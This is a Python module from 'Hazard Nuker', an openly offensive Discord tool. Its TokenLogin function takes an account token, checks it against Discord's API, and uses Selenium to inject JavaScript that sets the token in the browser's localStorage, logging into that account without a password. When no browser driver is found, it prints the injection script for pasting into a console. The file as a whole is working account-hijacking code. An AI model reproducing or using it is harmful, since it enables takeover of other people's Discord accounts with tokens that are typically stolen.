# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import requests
import Hazard

from time import sleep
from selenium import webdriver, common
from colorama import Fore, Back

from util.plugins.common import getDriver, getheaders, SlowPrint

def TokenLogin(token):
    j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
    user = j["username"] + "#" + str(j["discriminator"])
    script = """
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"%s"`
            location.reload();
        """ % (token)
    type_ = getDriver()

    if type_ == "chromedriver.exe":
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Chrome(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Enter anything to continue. . . ")
            input()
            Hazard.main()
    elif type_ == "operadriver.exe":
        opts = webdriver.opera.options.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Opera(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Enter anything to continue. . . ")
            input()
            Hazard.main()
    elif type_ == "msedgedriver.exe":
        opts = webdriver.EdgeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Edge(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint(f"Enter anything to continue. . .")
            input()
            Hazard.main()
    else:
        print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln\'t find a suitable driver to automatically login to {user}')
        sleep(3)
        print(f"{Fore.YELLOW}Paste this script into the console of a browser:{Fore.RESET}\n\n{Back.RED}{script}\n{Back.RESET}")
        print("Enter anything to continue. . . ", end="")
        input()
        Hazard.main()

    print(f"{Fore.GREEN}Logging into {Fore.CYAN}{user}")
    driver.get("https://discordapp.com/login")
    driver.execute_script(script)
    Hazard.main()